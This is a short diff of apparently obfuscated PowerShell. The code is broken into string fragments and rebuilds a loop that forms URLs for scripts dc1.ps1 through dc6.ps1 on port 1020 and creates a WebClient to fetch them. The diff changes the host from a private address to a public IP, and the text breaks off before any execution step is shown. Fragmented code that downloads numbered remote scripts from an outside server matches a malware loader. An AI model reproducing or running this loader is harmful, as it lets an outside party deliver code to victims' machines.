@@ -1,7 +1,7 @@
 $fragments = @('﻿
 for ($i = ','1; $i -le 6; $i','++) {
    
-   ',' $url = "http:/','/192.168.1.8',':1020/dc$i.ps1"','
+   ',' $url = "http:/','/103.252.94.132',':1020/dc$i.ps1"','
     
     
  ','   $webClient =',' New-Object Sys','tem.Net.WebClie','nt
